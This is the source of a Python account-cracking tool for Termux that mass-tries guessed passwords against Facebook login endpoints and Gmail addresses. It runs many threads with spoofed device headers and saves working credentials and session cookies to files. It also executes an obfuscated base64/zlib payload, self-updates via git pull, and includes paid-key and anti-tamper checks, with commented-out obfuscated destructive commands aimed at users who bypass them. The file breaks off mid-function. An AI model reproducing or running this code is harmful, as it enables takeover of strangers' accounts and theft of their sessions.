#Created by : PRIMO SOLTERO
#WhatsApp : 09098660941
#CODE BY : PRIMO
#CODE DESIGN BY PRIMO
#CODE FOR PRIMO
import os,sys,time,json,random,re,string,platform,base64,uuid,base64,zlib,hashlib,subprocess
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
import urllib 
from urllib.request import urlopen
from time import sleep
from time import sleep as waktu


try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as tred
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /primo/null')
    os.system('pip install bs4')
    
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
tan=('https')
iya=('github')
ani=('ariya')
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

ah="PRIMO~"
imt="-M4786=="
ak="~"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		menu()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6.0.0','6.1.0','7','7.0','8','8.0.0','8.1.0','9','10','11','12'])
    c=' en-us; SM-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for xd in range(30000):
    a='Nokia '
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku=(f'{a}{b}{c}{d}{e}{f}')
    ugen2.append(uaku)
    
exec(zlib.decompress(base64.b64decode("eJzLzVWwVdBQSsovMTQ1MTIwNbU0NrdydHQL8DBNLE6PNHGLLDUwNU9NynePMnIuLQ0PNa0oMfIuMFHSBADXLBCm")))
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Etisalat Af'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=1.5,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')



try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Etisalat Af"
                        sim_id+=fbcr
        else:
                fbcr = 'Etisalat Af'
                sim_id+=fbcr
except:
        fbcr = "Etisalat Af"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def clear():
	os.system('clear')
	print(logo)
def linex():
	print(47*'_')
loop = 0
oks = []
pcp=[]
cps=[]
#os.system('clear')
#print(logo)
## = input(' Put Your Network Name: ')
logo =f"""\x1b[1;97m

\33[1:32m██████╗░██████╗░██╗███╗░░░███╗░█████╗░
\33[1:32m██╔══██╗██╔══██╗██║████╗░████║██╔══██╗
\33[1:32m██████╔╝██████╔╝██║██╔████╔██║██║░░██║
\33[1:32m██╔═══╝░██╔══██╗██║██║╚██╔╝██║██║░░██║
\33[1:32m██║░░░░░██║░░██║██║██║░╚═╝░██║╚█████╔╝
\33[1:32m╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░╚════╝░
                                   

                                                      

\033[1;36m["ENJOY HACKER"]
  
------------------------------------------------------------------------
\33[1;36m ᴀᴜᴛʜᴏʀ    : PRIMO SOLTERO
\33[1;36m ᴠᴇʀsɪᴏɴ    : 0.1
\33[1;36m ғᴀᴄᴇʙᴏᴏᴋ  : PRIMO SOLTERO
\33[1;36m ᴛᴏᴏʟ sᴛᴀᴛᴜs : TRIAL
------------------------------------------------------------------------"""

def clear():
    os.system('clear')
    print(logo)

def x1():

  if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):

    print("Turn OFF protacton System")

    time.sleep(2)

    print("\n Run again : python spy.py")

    time.sleep(5)

    exit()

def x2():

  file = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r")

  data = file.read()

  word =("print(url)")

  if word in data:

    print(' unknown error.,,,,, ')

    time.sleep(1)

    print(' tring to fix error,,,, ')
    os.system('pip uninstall requests -y')
    os.system('pip install requests')
    print (' Run again : python spy.py')
    exit()

def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id ='Its-PRIMO' +'→'.join(uuid)+str(os.getlogin())
  server = requests(f'https://github.com/primo-png/CR4CKING-PRIMO/blob/main/A.txt').get
  x1()
  x2()
  try:
    httpCaht = requests(f'https://github.com/primo-png/CR4CKING-PRIMO/blob/main/A.txt').get.text
    if id in httpCaht:
      print(f"\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
      print(f" Your Key : {id}")
      print(f"    Send payment to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open {tan}://wa.me/+8801317289813?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id ='PRIMO-FREE-NOT-ALLOW'
	server = requests.get(f'{tan}://{iya}.com/F{ani}122/vip/blob/main/a.txt').text
	try:
		httpCaht = requests.get(f"{tan}://{iya}.com/F{ani}122/vip/blob/main/b.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			fucked()
		else:
			msg = str(os.geteuid())
			pass
	except:
			sys.exit()

def fucked():
	print(' Chacking password,,,,,')
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print(' Access Done,,,,, ');time.sleep(1)
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	#os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	print(' Fuck You Bypass User ');exit()

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def security():
	clear()
	print(" Chacking Your Aprobal,,,,,,,,,,,,")
	#server()
	xnx=input(' Enter your password : ')
	if xnx in ["PRIMO"]:
	  sub()
	else:
	  print(" \033[1;31mWRONG PASSWORD!!!")
	  time.sleep(4)
	  security()
#sucrity()



def menu():
	os.system('clear')
	print(logo)
	print('[1] Start Random Crack ')
	print('[2] Start File Cracking')
	print('[3] Gmail Cloning ')
	print('[0] Exit Menu')
	print(47*'_')
	opt = input('[?] Choose : ')
	if opt =='1':
		vx()
	elif opt =='2':
		file()
	elif opt =='3':
		gml()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [•] Choose valid option\033[0;97m')
def vx():
	clear()
	print(' [1] RANDOM METHOD (1)')
	print(' [2] RANDOM METHOD (2)')
	fv = input(' CHOICE : ')
	if fv =='1':
		v1()
	elif fv =='2':
		v2()
def file():
	clear()
	print(' [1] FILE CLONER SLOW')
	print(' [2] FILE CLONER FAST')
	fc = input(' CHOICE : ')
	if fc =='1':
		file1()
	elif fc =='2':
		file2()
def gml():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" First name : ")
	de = input(" Last name : ")
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(2,6))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+de+love+'@gmail.com'
			pwx = [ko,de,ko+de,ko+' '+de,ko+'123',ko+'1234',ko+'12345',ko+'@123','bangladesh','Bangla','@#@#@#','@@@###','i love you','free fire']
			#pwx = ['123890',uid,ko+kod,ko+kod+kode,uid[5:],uid[3:],uid[4:],'Bangladesg','bangladesh','i love you','bangla','Bangla','@#@#@#','@@@###','###@@@','free fire']
			yaari.submit(mumit2,uid,pwx,tl)
	print(47*"\n\033[1;37m-")
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/PRIMO-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/PRIMO-CP.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            pass
def v1():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" Sim Code : ")
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	kode = ''.join(random.choice(string.digits) for _ in range(2))
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+kod+kode+love
			pwx = ['123890','freefire',uid,ko+kod+kode,kode+love,kod+kode+love,'bangladesh','Bangladesh','i love you','Bnagla','@#@#@#']
			yaari.submit(mumit2,uid,pwx,tl)
def v2():
	user=[]
	os.system("clear")
	print(logo)
	print(50*'_')
	ko = input(" Sim Code : ")
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	kode = ''.join(random.choice(string.digits) for _ in range(2))
	limit = int(input('[?] CRACKING LIMITE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=50) as yaari:
		os.system("clear")
		print(logo)
		print(50*'_')
		tl = str(len(user))
		print(f' Total ids : {tl}')
		print(' Wait for ids ')
		print(50*'_')
		for love in user:
			uid = ko+kod+kode+love
			#pwx = ['123890','freefire',uid,ko+kod+kode,kode+love,kod+kode+love,'bangladesh','Bangladesh','i love you','Bnagla','@#@#@#']
			pwx = [ko+kod+kode,kode+love]
			yaari.submit(rcrack,uid,pwx,tl)
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[Mr.SPY-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers = headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=gIRNZQ924iM0Rix3sH4PRE1k; sb=gIRNZRr7QqSz7KD4BHfvYZcz; vpd=v1%3B660x360x3; locale=en_US; wl_cbv=v2%3Bclient_version%3A2354%3Btimestamp%3A1699714321; m_pixel_ratio=3; wd=360x660; fr=0li8aQmCTi3u7DtNt.AWXi4tJWuZywWHI-0E1Wc5PKmPM.BlTYSA.o6.AAA.0.0.BlUO7b.AWVlQ_VbCHg',
    'dpr': '3',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3241"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post(  'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(50*'_')
                print(f"\033[1;92m[Mr.SPY-OK] {cid}|{ps} \n")
                #print(f' Useragent : {pro}')
                open('/sdcard/SPY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                cek_apk(session,coki)
                print(50*'_')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[Mr.SPY-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
                open('/sdcard/SPY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass


def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers =headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=gIRNZQ924iM0Rix3sH4PRE1k; sb=gIRNZRr7QqSz7KD4BHfvYZcz; vpd=v1%3B660x360x3; locale=en_US; wl_cbv=v2%3Bclient_version%3A2354%3Btimestamp%3A1699714321; m_pixel_ratio=3; wd=360x660; fr=0li8aQmCTi3u7DtNt.AWXi4tJWuZywWHI-0E1Wc5PKmPM.BlTYSA.o6.AAA.0.0.BlUO7b.AWVlQ_VbCHg',
    'dpr': '3',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3241"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post( 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[PRIMO-ALIVE] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/PRIMO-ALIVE.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\r\r\x1b[1;36m [PRIMO-DEAD] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/PRIMO-DEAD.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [PRIMO-V1-RNDM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def file1():
	clear()
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' File location not found ')
		time.sleep(1)
		main()
	clear()
	plist=[]
	try:
		ps_limit = int(input(' How many passwords do you want to add ? '))
	except:
		ps_limit =1
	linex()
	print('\033[1;32m exp: first last,firtslast,first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f' Put password {i+1}: '))
	linex()
	print(' Do you want to show cp ids? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as crack_submit:
		clear()
		total_ids = str(len(fo))
		print(' Total ids : \033[1;32m'+total_ids)
		print("\033[1;31m The Burte Has Been Started Wait & Watch\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(api,ids,names,passlist)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	os.system('python X.py')


def api(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [PRIMO-SLOW-FILE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fbrv = str(random.randint(111111111,999999999))
			model = device['model']
			build = device['build']
			fblc = device['fblc']
			fbcr = sim_id
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
			fbca = device['fbca']
			fbdm = device['fbdm']
			ua = "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.3019.138 Mobile Safari/537.36 VivoBrowser/10.3.6.6','Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4618.53 Mobile Safari/537.36 VivoBrowser/7.8.1.8','Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4105.123 Mobile Safari/537.36 VivoBrowser/5.2.5.4','Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3971.144 Mobile Safari/537.36 VivoBrowser/9.7.6.2','Mozilla/5.0 (Linux; Android 6.0.1; vivo 1606 Build/MMB29M;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.3416.57 Mobile Safari/537.36 VivoBrowser/10.3.6.5"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				uid = q['uid']
				tok = q['access_token']
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print('\r\r\033[1;32m [PRIMO-ALIVE] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/PRIMO-ALIVE.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				#print('\r\r\x1b[1;33m [PRIMO-DEAD] '+str(ids)+' | '+pas+'\033[1;97m')
				open('/sdcard/PRIMO-DEAD.txt','a').write(str(ids)+'|'+pas+'\n')
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		#print(e)
		pass

def file2():
	clear()
	me='1'
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' Put file path\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			exit()
		mthd='1'
		plist=[]
		try:
			ps_limit = int(input(f' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m exp: first last, First Last, first123')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		print(f' Do you want to show cp ids? (y/n): ')
		cx=input(f' Choose: ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' Total account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod > \033[1;37mM{mthd}')
			print(f"\033[1;37m Use flight mode for speed up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb1,ids,names,passlist)
				else:
					crack_submit.submit(ffb1,ids,names,passlist)
def ffb1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
